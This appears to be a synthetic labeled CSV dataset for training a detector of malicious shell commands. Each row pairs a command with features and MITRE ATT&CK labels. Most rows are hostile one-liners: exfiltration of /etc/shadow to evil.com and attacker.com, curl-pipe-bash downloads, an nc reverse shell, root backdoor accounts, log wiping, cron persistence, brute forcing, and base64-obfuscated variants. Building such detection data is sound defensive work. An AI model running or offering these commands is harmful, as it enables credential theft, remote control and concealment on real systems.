whoami /all ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""crontab -e ; echo done""","[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'c3UgLSBhZG1pbiA7IGVjaG8gZG9uZQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo  'dw=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
time nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1496_Resource_Hijacking'],synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe && > /dev/null 2>&1,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0.0, 0.4, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' && > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
strings /proc/*/mem | grep -i password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
time for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.56, 0, 0]",['T1110_Brute_Force'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
"bash -c ""groups $(whoami)""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"time python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
getent  passwd  |  grep  -v  nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ssh admin@localhost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
sudo echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2hv' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nohup masscan -p1-65535 10.0.0.0/24 --rate=1000 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbiAmJiBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg  add  HKLM\Software\Microsoft\Windows\CurrentVersion\Run  /v  Backdoor  /d  C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time sudo -u www-data bash && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nmap  -sV  --version-intensity  5  -p  1-65535  10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'ZWNobyAnKi81ICogKiAqICogY3VybCBodHRwOi8vYzIuY29tL2JlYWNvbicgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""git clone https://github.com/user/repo.git""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nmap -sn 192.168.1.0/24 | sleep 1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.32, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh | history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo  'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
uptime,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
at now + 1 minute <<< '/tmp/payload' && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ln  -s  /tmp/backdoor.sh  /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
route -n && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
arp -a && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ssh admin@localhost &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'ZWNobyAnYUdWc2JHOD0nIHwgYmFzZTY0IC1kIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
Get-LocalGroupMember -Group Administrators && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup locate wp-config.php &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time ./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/os-release | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time curl -X POST http://evil.com/collect -d @/etc/shadow | > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80 ; echo done,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
pip  install  requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
curl  -s  http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
powershell.exe -EncodedCommand JABzA... && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nmap --script=vuln 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""ip addr show""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
sudo ip link show | history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup whoami &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
whoami,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
nohup nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
pwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
ssh -L 8080:internal:80 user@jump.host | echo done,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
time traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo 'aGVsbG8=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo  'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaCA7IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykpICYmIHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
time usermod -aG sudo compromised_user | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
net user /domain && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIic=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup getent passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
time unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nohup echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
time net localgroup administrators ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
